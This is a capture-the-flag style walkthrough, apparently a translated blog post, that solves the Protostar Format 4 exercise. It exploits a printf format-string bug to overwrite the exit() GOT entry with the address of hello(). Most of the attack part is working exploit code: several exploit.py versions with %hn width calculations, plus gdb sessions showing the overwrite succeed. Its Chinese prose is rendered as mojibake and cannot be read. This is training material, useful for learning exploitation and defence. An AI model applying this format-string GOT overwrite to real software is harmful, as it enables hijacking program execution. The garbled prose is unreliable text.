# [ExpDev]æ¼æ´åˆ©ç”¨ç»ƒä¹ | Protostar |æ ¼å¼ 4

> åŸæ–‡ï¼š<https://infosecwriteups.com/expdev-exploit-exercise-protostar-format-4-e2907b4716d1?source=collection_archive---------2----------------------->

![](img/ceaf1b32cd6771632e8837d376cfaa36.png)

# æ ¼å¼ 4(æ ¼å¼å­—ç¬¦ä¸²æ¼æ´:GOT)

è¯¥æŒ‘æˆ˜çš„ç›®æ ‡æ˜¯é€šè¿‡åˆ©ç”¨å…¨å±€åç§»è¡¨(â€œGOTâ€)è€Œä¸æ˜¯æˆ‘ä»¬åœ¨ä¹‹å‰çš„æ ¼å¼å­—ç¬¦ä¸²æ¼æ´æŒ‘æˆ˜ä¸­ä½¿ç”¨çš„è¿”å›æŒ‡é’ˆï¼Œé‡å®šå‘æˆ‘ä»¬çš„æ‰§è¡Œæµä»¥æ‰“å°è·èƒœçš„è¯­å¥ã€‚è®©æˆ‘ä»¬çœ‹çœ‹æˆ‘ä»¬å¦‚ä½•åšåˆ°è¿™ä¸€ç‚¹:)

*   é“¾æ¥:[https://exploit-exercises.lains.space/protostar/format4/](https://exploit-exercises.lains.space/protostar/format4/)

![](img/b03ad914c88216cc76f7d0c5e6e31602.png)

## æ³¨æ„äº‹é¡¹

*   `**char buffer[512]**`:è®¾ç½®ç¼“å†²åŒºå¤§å°ä¸º 512ã€‚
*   `**fgets(buffer, sizeof(buffer), stdin)**`:è·å–ç”¨æˆ·æä¾›çš„è¾“å…¥ã€‚å¹¶ä¸”å®ƒå°†ç¼“å†²åŒºå¤§å°é™åˆ¶ä¸º 512ã€‚æˆ‘ä»¬å¯ä»¥æœ€å¤§è¾“å…¥ 511 ä¸ªå­—èŠ‚ï¼Œå› ä¸º C æ€»æ˜¯åœ¨å­—ç¬¦ä¸²æœ«å°¾æ·»åŠ `0x00`ä½œä¸ºç»ˆæ­¢ç¬¦ã€‚
*   `**printf(buffer);**`:è¿™æ˜¯è¿™æ®µä»£ç ä¸­æ˜“å—æ”»å‡»çš„å‡½æ•°ã€‚`printf()`å°†*è€Œé*æ£€æŸ¥æ‰€æä¾›çš„è¾“å…¥æ˜¯å¦æ˜¯é¢„æœŸçš„æ ¼å¼å­—ç¬¦ä¸²ï¼Œå› ä¸ºå®ƒè¢«ç¼–ç ä¸ºæ¥å—ä»»ä½•å­—ç¬¦ä¸²å€¼ã€‚æ‰€ä»¥æˆ‘ä»¬èƒ½åšçš„å°±æ˜¯ç®€å•åœ°éªŒè¯æˆ‘ä»¬æ˜¯å¦å¯ä»¥æ³„æ¼å†…å­˜åœ°å€ï¼Œå¹¶ä¸”ä¹Ÿå¯ä»¥å°†ä»»æ„ä»£ç å†™åˆ°å †æ ˆä¸Š(**ã€è¯»å–ã€‘** `%p`æˆ–è€…`%x` â†’ **ã€å†™å…¥ã€‘** `%n`)ã€‚
*   `**exit(1);**`:`exit(1)`æ˜¯ä¸€ä¸ªç³»ç»Ÿè°ƒç”¨ï¼Œå®ƒç®€å•åœ°é€€å‡ºç¨‹åºã€‚ä¸ä¹‹å‰çš„ç»ƒä¹ ä¸åŒï¼Œæˆ‘ä»¬åœ¨`printf()`ä¹‹åæ²¡æœ‰ä»»ä½•è¿”å›åœ°å€ï¼›ç›¸åï¼Œæˆ‘ä»¬æœ‰è¿™ä¸ª`exit(1)`ã€‚ä½†æ˜¯æˆ‘ä»¬å¯ä»¥åšçš„æ˜¯ï¼Œç”±äº`exit(1)`æ˜¯å…¨å±€åç§»è¡¨(â€œGOTâ€)çš„ä¸€éƒ¨åˆ†ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨`hello()`çš„åœ°å€è¦†ç›–å®ƒçš„`exit(1)`å‡½æ•°çš„å…¥å£ç‚¹ï¼Œä»¥æ‰“å°å‡ºè·èƒœçš„è¯­å¥ã€‚

## æœ‰ä»€ä¹ˆï¼Ÿ

![](img/ed9da8f06f7568698314e29c9841d9b8.png)

æ¥æº:[https://ctf101.org/binary-exploitation/what-is-the-got/](https://ctf101.org/binary-exploitation/what-is-the-got/)

ç®€å•åœ°è¯´ï¼ŒGOT å¸®åŠ©åœ¨åŠ¨æ€é“¾æ¥çš„ ELF äºŒè¿›åˆ¶æ–‡ä»¶ä¸­åŠ è½½å…±äº«åº“å‡½æ•°(ä¾‹å¦‚`exit()`)ã€‚åŸºæœ¬ä¸Šï¼Œä¸€ä¸ªäººå¯ä»¥åˆ›å»ºä»–ä»¬çš„ç¨‹åºï¼Œè€Œä¸éœ€è¦é‡æ–°ç¼–å†™åƒ`exit()`è¿™æ ·çš„æµè¡Œå‡½æ•°ï¼›ç›¸åï¼Œå®ƒä»¬å¯ä»¥æ·»åŠ æŒ‡é’ˆæ¥è°ƒç”¨è¿™äº›å‡½æ•°ï¼Œå› ä¸ºå®ƒä»¬å¯ä»¥åœ¨è¿è¡Œæ—¶åŠ¨æ€åŠ è½½ã€‚ä¸‹é¢æ˜¯ ASM æ–‡ä»¶ç¤ºä¾‹:

![](img/bd0405092aaac927ebc7d3340ab4ad83.png)

æ¥æº:[https://github . com/big B0 SSS/b 0 ssheasm/blob/master/0x 06 _ libc/libc _ 01 . nasm](https://github.com/bigb0sss/b0ssTheASM/blob/master/0x06_libc/libc_01.nasm)

# æ‹†è§£(GDB)

è®©æˆ‘ä»¬åæ±‡ç¼–äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œçœ‹çœ‹åœ¨ ASM çº§åˆ«åšäº†ä»€ä¹ˆã€‚

```
**$ gdb -q /opt/protostar/bin/format4**
Reading symbols from /opt/protostar/bin/format4...done.
**(gdb) set disassembly-flavor intel 
(gdb) disassemble vuln**
```

![](img/a5199cffe85bd327d50d7223666bf06f.png)

ä»æºä»£ç çš„è§’åº¦æ¥çœ‹ï¼Œç¨‹åºæœ¬èº«éå¸¸ç®€å•ã€‚æˆ‘ä»¬ç°åœ¨åªéœ€è¦è®°ä¸‹`exit()`å‡½æ•°(`0x8049724`)çš„å…¥å£åœ°å€ã€‚

# å‰¥å‰Š

## åˆæ­¥ä¾¦å¯Ÿ

åƒå¾€å¸¸ä¸€æ ·ï¼Œè®©æˆ‘ä»¬æä¾›ä¸€äº›éšæœºçš„å­—ç¬¦ä¸²:

```
**$ python -c 'print "AAAA"' | /opt/protostar/bin/format4**
AAAA
```

æ‰“å°å‡ºæˆ‘ä»¬è¾“å…¥çš„ä»»ä½•å­—ç¬¦ä¸²ã€‚ä½†æ˜¯å¦‚æœæä¾›ä¸€äº›æ ¼å¼å­—ç¬¦ä¸²å‚æ•°(`%08x`ï¼Œæˆ‘ä»¬ä¼šå¾—åˆ°ä¸€äº›æœ‰è¶£çš„è¾“å‡º:

```
**$ python -c 'print "AAAA" + "|%08x" * 2' | /opt/protostar/bin/format4**
AAAA|00000200|b7fd8420***### Format String Explanation
"%08x"*** *= "%x" is a Format String parameter of the hexdecimal 
         representation. 
         The number "08" is the minimum value for "width field."
         This will pad the output of the "%x" specified to 8
         characters, which is equal to 4 bytes long.*
```

## å¯»æ‰¾åç§»

æ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬éœ€è¦æ‰¾åˆ°åœ¨å †æ ˆä¸Šå¯ä»¥çœ‹åˆ°æˆ‘ä»¬æä¾›çš„è¾“å…¥çš„åç§»é‡ã€‚å¦‚æœæˆ‘ä»¬å°è¯•å¢åŠ å‡ ä¸ª`%x`ï¼Œæˆ‘ä»¬å¯ä»¥å‘ç°åç§»é‡ä¸º 4ã€‚

```
**$ python -c 'print "AAAA" + "|%08x" * 3' | /opt/protostar/bin/format4**
AAAA|00000200|b7fd8420|bffff5f4**$ python -c 'print "AAAA" + "|%08x" * 4' | /opt/protostar/bin/format4**
AAAA|00000200|b7fd8420|bffff5f4|**41414141    <-- chr(0x41) = "A"**
```

## ç¡®è®¤å¯¹ GOT æ¡ç›®çš„å†™å…¥

å¦‚æœæ‚¨æœ‰ç–‘é—®ï¼Œè®©æˆ‘ä»¬ç¡®è®¤ä¸€ä¸‹æˆ‘ä»¬æ˜¯å¦å¯ä»¥è¦†ç›–`exit(1)` GOT ( `0x8049724`ï¼Œ*æˆ‘ä»¬ä»ä¸Šé¢çš„â€œæ‹†å¸(GDB)â€éƒ¨åˆ†è·å¾—äº†è¿™ä¸ªåœ°å€ğŸ™‚*åŒæ­¤ã€‚ä¸ºæ­¤ï¼Œæˆ‘ä»¬éœ€è¦åˆ›å»ºä¸€ä¸ªç®€å•çš„æ¼æ´åˆ©ç”¨è„šæœ¬:

```
**[exploit.py]**#!/usr/bin/pythonimport structexit_plt = 0x8049724                      **# Entry of exit(1) GOT**exploit = ""
exploit+= struct.pack("I",exit_plt)       
exploit+= "%4$08n"                        **# Write a number of 
                                            characters in the 4th 
                                            location (= offset)**print exploit
```

å°†è¿™ä¸ªæ–‡ä»¶ä½œä¸ºè¾“å‡ºï¼Œè¿™æ ·æˆ‘ä»¬å°±å¯ä»¥å°†å®ƒè¾“å…¥åˆ° gdb ä¸­:

```
**$ python exploit.py > exploit**
```

è¿è¡Œ gdbï¼Œåœ¨`printf()`å’Œ`exit()`ç³»ç»Ÿè°ƒç”¨ä¸Šè®¾ç½®æ–­ç‚¹ï¼Œå¹¶æä¾›æˆ‘ä»¬çš„`exploit`è¾“å‡º:

```
**$ gdb -q /opt/protostar/bin/format4** 
  Reading symbols from /opt/protostar/bin/format4...done.
**(gdb) set disassembly-flavor intel** 
**(gdb) disassemble vuln**
Dump of assembler code for function vuln:
  0x080484d2 <vuln+0>: push   ebp
  0x080484d3 <vuln+1>: mov    ebp,esp
  0x080484d5 <vuln+3>: sub    esp,0x218
  0x080484db <vuln+9>: mov    eax,ds:0x8049730
  0x080484e0 <vuln+14>: mov    DWORD PTR [esp+0x8],eax
  0x080484e4 <vuln+18>: mov    DWORD PTR [esp+0x4],0x200
  0x080484ec <vuln+26>: lea    eax,[ebp-0x208]
  0x080484f2 <vuln+32>: mov    DWORD PTR [esp],eax
  0x080484f5 <vuln+35>: call   0x804839c <fgets@plt>
  0x080484fa <vuln+40>: lea    eax,[ebp-0x208]
  0x08048500 <vuln+46>: mov    DWORD PTR [esp],eax
  **0x08048503 <vuln+49>: call   0x80483cc <printf@plt>   <-- Break 1**
  0x08048508 <vuln+54>: mov    DWORD PTR [esp],0x1
  **0x0804850f <vuln+61>: call   0x80483ec <exit@plt>     <-- Break 2**
  End of assembler dump.
**(gdb) break * 0x08048503**
  Breakpoint 1 at 0x8048503: file format4/format4.c, line 20.
**(gdb) break * 0x0804850f**
  Breakpoint 2 at 0x804850f: file format4/format4.c, line 22.
**(gdb) run < /home/user/format4/exploit** 
  Starting program: /opt/protostar/bin/format4 < /home/user/format4\. 
  /exploit Breakpoint 1, 0x08048503 in vuln () at format4/format4.c:20
  20 format4/format4.c: No such file or directory.
**(gdb) disassemble 0x80483ec                   <-- Disassemble exit()**
  Dump of assembler code for function exit@plt:
  0x080483ec <exit@plt+0>: jmp    DWORD PTR ds:**0x8049724**
  0x080483f2 <exit@plt+6>: push   0x30
  0x080483f7 <exit@plt+11>: jmp    0x804837c
  End of assembler dump.
**(gdb) x 0x8049724                  <-- Examine the current GOT entry**
  0x8049724 <_GLOBAL_OFFSET_TABLE_+36>: **0x080483f2**
**(gdb) continue**
  Continuing.
  $ï¿½ Breakpoint 2, 0x0804850f in vuln () at format4/format4.c:22
  22 in format4/format4.c
**(gdb) x 0x8049724                  <-- Examine the current GOT entry**
  0x8049724 <_GLOBAL_OFFSET_TABLE_+36>: **0x00000004**
```

å¤ªå¥½äº†ã€‚å¦‚æ‚¨æ‰€è§ï¼Œä»`0x080483f2`åˆ°`0x00000004`çš„æœ‰æ•ˆè½½è·å·²ç»è¦†ç›–äº† GOT åœ°å€çš„æ¡ç›®ã€‚ç°åœ¨ï¼Œæˆ‘ä»¬åªéœ€è¦æ‰¾åˆ°`hello()`å‡½æ•°çš„åœ°å€ï¼Œå¹¶æ›´æ–°æˆ‘ä»¬çš„æ¼æ´ï¼Œç”¨å®ƒæ¥æ­£ç¡®åœ°è¦†ç›– get å…¥å£ç‚¹ã€‚

## æ­£åœ¨æŸ¥æ‰¾â€œhello()â€çš„åœ°å€

```
**$ objdump -t /opt/protostar/bin/format4 |grep hello**
**080484b4** g     F .text 0000001e              hello
```

æ‰¾åˆ°çš„`hello()`åŠŸèƒ½çš„åœ°å€æ˜¯`0x080484b4`ã€‚

## æœ€ç»ˆåˆ©ç”¨(2 å­—èŠ‚çŸ­å†™)

ç”±æ­¤çœ‹æ¥ï¼Œè¿™ä¸ªæ¼æ´åº”è¯¥ä¸æˆ‘ä»¬åœ¨`Format3`ç»ƒä¹ [å’Œ](https://medium.com/@bigb0ss/expdev-exploit-exercise-protostar-format-3-33e8d8f1e83)ä¸­æ‰€åšçš„éå¸¸ç›¸ä¼¼ã€‚ç”±äºç”¨å®½åº¦å­—æ®µæ§åˆ¶`%n`å¾ˆç®€å•ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ä»»ä½•æŠ€æœ¯ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œæˆ‘ä»¬å°†ç”¨ 2 å­—èŠ‚çš„çŸ­å†™æ–¹æ³•æ¥è§£å†³è¿™ä¸ªé—®é¢˜ã€‚

ä¸ºäº†è¿›ä¸€æ­¥æ¾„æ¸…ï¼Œè®©æˆ‘å¿«é€Ÿè§£é‡Šä¸€ä¸‹è¿™å°†å¦‚ä½•è¿›è¡Œ:

```
**1) Our overwriting point:** 
  0x08049724 (Entry of the exit() GOT)**2) Desired value that we want to overwrite with:**
  0x080484b4 (hello())**3) 2-byte Short Write points:
(gdb) x 0x8049724**
0x8049724 <_GLOBAL_OFFSET_TABLE_+36>: **0x080483f2**
                                          â¬‡
                    0x08           **04**             83             **f2**
              ------------------------------------------------------
              0x8049727      **0x8049726      0x8049725      0x8049724**
```

æ ¹æ®ä¸Šé¢çš„è¡¨ç¤ºï¼Œæˆ‘ä»¬å°†åˆ©ç”¨åœ°å€:`**0x8049724**`å’Œ`**0x8049726**`ã€‚æ¥å¾—åˆ°æˆ‘ä»¬æƒ³è¦çš„å€¼ã€‚

è®©æˆ‘ä»¬éªŒè¯ä¸€ä¸‹ï¼Œæˆ‘ä»¬æ˜¯å¦å¯ä»¥åœ¨è¿™äº›`**0x8049724**`å’Œ`**0x8049726**`åœ°å€ä¸Šå†™å…¥ä»»æ„å€¼:

```
**[exploit.py]**#!/usr/bin/pythonimport structhello = 0x080484b4
exit_plt = 0x8049724                      
exit_plt2 = 0x8049726exploit = ""
exploit+= struct.pack("I",exit_plt)
exploit+= struct.pack("I",exit_plt2)
exploit+= "%4$08n"
exploit+= "%5$08n"print exploit
```

ä¸€æ—¦æˆ‘ä»¬å°†ä¸Šè¿°æ¼æ´ä¿å­˜åˆ°ä¸€ä¸ªæ–‡ä»¶ä¸­ï¼Œè¿è¡Œ gdb æ¥æ£€æŸ¥æˆ‘ä»¬æ˜¯å¦å¯ä»¥è¦†ç›–æ¯ä¸ªåœ°å€ä½ç½®:

```
**### Confirming 2-byte Overwrite on GOT Entry****(gdb) run < /home/user/format4/exploit** 
  Starting program: /opt/protostar/bin/format4 < /home/user/format4 
  /exploit Breakpoint 1, 0x08048503 in vuln () at format4/format4.c:20
  20 in format4/format4.c
**(gdb) x 0x8049724**
  0x8049724 <_GLOBAL_OFFSET_TABLE_+36>: 0x080483f2
**(gdb) continue**
  Continuing.
  $&ï¿½ Breakpoint 2, 0x0804850f in vuln () at format4/format4.c:22
  22 in format4/format4.c
**(gdb) x 0x8049724**
  0x8049724 <_GLOBAL_OFFSET_TABLE_+36>: **0x00080008**
```

å¾ˆå¥½ã€‚æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼Œæˆ‘ä»¬çš„å°è¯•åœ¨æ¯ä¸ªåœ°å€ä½ç½®ä¸Šéƒ½å†™äº†`0x0008`å€¼ã€‚ç°åœ¨ï¼Œæˆ‘ä»¬åªéœ€è¦è®¡ç®—å®½åº¦å­—æ®µï¼Œä»¥ä¾¿è¾“å‡ºæˆ‘ä»¬æƒ³è¦çš„å€¼ã€‚( *** [*æŸ¥çœ‹*](https://medium.com/bugbountywriteup/expdev-exploit-exercise-protostar-format-2-73ef08011a8c) `[*Format2*](https://medium.com/bugbountywriteup/expdev-exploit-exercise-protostar-format-2-73ef08011a8c)` [*ç»ƒä¹ ï¼Œäº†è§£å…³äºå®½åº¦å­—æ®µè®¡ç®—çš„æ›´å¤šè¯¦ç»†è¯´æ˜*](https://medium.com/bugbountywriteup/expdev-exploit-exercise-protostar-format-2-73ef08011a8c) )

```
**### Final Exploit**0x080484b4    **<-- Desired value & divide this into 2**
    â¬‡  
  0x84b4      **<-- We will write this on "0x8049724"**
  0x0804      **<-- We will write this on "0x8049726"** **[Width Calculation #1: "0x8049724"]
____________________________________________________________________** *# Written value was "0008." In order to calculate the width field, we need to subtract "0008" from our desired value = "*0x84b4*"*(gdb) print 0x84b4 - 0x0008
  $5 = **33964****[exploit.py - Width Calculation #1]**#!/usr/bin/pythonimport structhello = 0x080484b4
exit_plt = 0x8049724
exit_plt2 = 0x8049726exploit = ""
exploit+= struct.pack("I",exit_plt)
exploit+= struct.pack("I",exit_plt2)
exploit+= **"%33964x%4$hn"**
exploit+= "%5$08n"print exploit**[gdb - Width Calculation #1]****(gdb) run < /home/user/format4/exploit**
*...(snip)...*
**(gdb) x 0x8049724**
  0x8049724 <_GLOBAL_OFFSET_TABLE_+36>: 0x84b4**84b4   <-- Written OK** **[Width Calculation #2: "0x8049726"]
____________________________________________________________________***# From the above calculation as you can see the second 2 byte location is also filled with "84b4" which means we need to subtract that value from our desired value to get the correct width field.***(gdb) print 0x0804 - 0x84b4**
  $6 = -31920*# Holdup... Negative output? Obviously, we cannot use this negative padding. In this case, however, there is a trick that we overflow into the next byte to get our desired value on the target location. Since we have a control on the stack, we can still overwrite the overflowed value. Example below:***(gdb) print 0x10804 - 0x84b4**
  $7 = **33616****[exploit.py - Width Calculation #2]**#!/usr/bin/pythonimport structhello = 0x080484b4
exit_plt = 0x8049724
exit_plt2 = 0x8049726exploit = ""
exploit+= struct.pack("I",exit_plt)
exploit+= struct.pack("I",exit_plt2)
exploit+= "%33964x%4$hn"
exploit+= **"%33616x%5$hn"**print exploit**[gdb - Width Calculation #2]****(gdb) run < /home/user/format4/exploit**
*...(snip)...*
**(gdb) x 0x8049724** 0x8049724 <_GLOBAL_OFFSET_TABLE_+36>: **0x080484b4   <-- Written OK**
**(gdb) continue**
  Continuing.
  **code execution redirected! you win   <-- Winning Statement!** Program exited with code 01.
```

å®Œç¾ï¼æˆ‘ä»¬æˆåŠŸåœ°åˆ©ç”¨äº†æ ¼å¼å­—ç¬¦ä¸²æ¼æ´æ¥è¦†ç›–`exit()`çš„å…¥å£ç‚¹ï¼Œä»è€Œé‡å®šå‘æˆ‘ä»¬çš„æ‰§è¡Œæµæ¥æ‰“å°å‡ºè·èƒœçš„è¯­å¥ã€‚

æˆ‘ä»¬è¿˜å¯ä»¥å°†æœ€ç»ˆçš„æ¼æ´è„šæœ¬ç›´æ¥è¿è¡Œåˆ°`format4`äºŒè¿›åˆ¶æ–‡ä»¶ä¸­:

```
**$ python /home/user/format4/exploit.py | /opt/protostar/bin/format4**
...(snip of A LOT OF white spaces)...
                                         b7fd8420
**code execution redirected! you win**
```

æ„Ÿè°¢é˜…è¯»ï¼

![](img/3735507d2c93e53a5b9d4423146e377a.png)